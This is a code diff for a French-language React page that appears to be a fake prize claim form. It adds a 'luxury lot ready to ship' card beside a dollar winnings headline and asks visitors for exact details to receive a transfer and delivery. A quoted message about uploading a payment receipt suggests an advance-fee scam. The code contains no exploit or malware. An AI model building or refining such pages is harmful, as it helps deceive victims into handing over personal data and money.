@@ -223,13 +223,26 @@ Voici mon reçu PDF téléchargé. Merci de valider mon transfert et la livraiso
             Formulaire Officiel de Réclamation
           </div>
 
+          {winningItem && (
+            <div className="mb-6 p-3 rounded-2xl bg-brandDark-800/90 border border-yellow-500/40 flex items-center gap-3 text-left">
+              <img
+                src={winningItem.image}
+                alt={winningItem.name}
+                className="w-14 h-14 object-cover rounded-xl border border-yellow-400 shrink-0 shadow-md"
+              />
+              <div>
+                <span className="text-[10px] text-yellow-400 font-bold uppercase tracking-wider block">
+                  🎁 Lot de luxe prêt à expédier
+                </span>
+                <span className="text-sm font-black text-white block">
+                  {winningItem.name} ({winningItem.valueEst})
+                </span>
+              </div>
+            </div>
+          )}
+
           <h2 className="text-2xl sm:text-3xl font-display font-black text-white">
             RECEVEZ VOS <span className="text-gold-gradient">{winningPrize.toLocaleString("en-US")} $</span>
-            {winningItem && (
-              <span className="block text-lg text-yellow-300 font-bold mt-1">
-                + {winningItem.icon} {winningItem.name}
-              </span>
-            )}
           </h2>
           <p className="text-xs sm:text-sm text-gray-300">
             Remplissez vos informations exactes pour recevoir votre virement et l'expédition de votre lot de luxe.
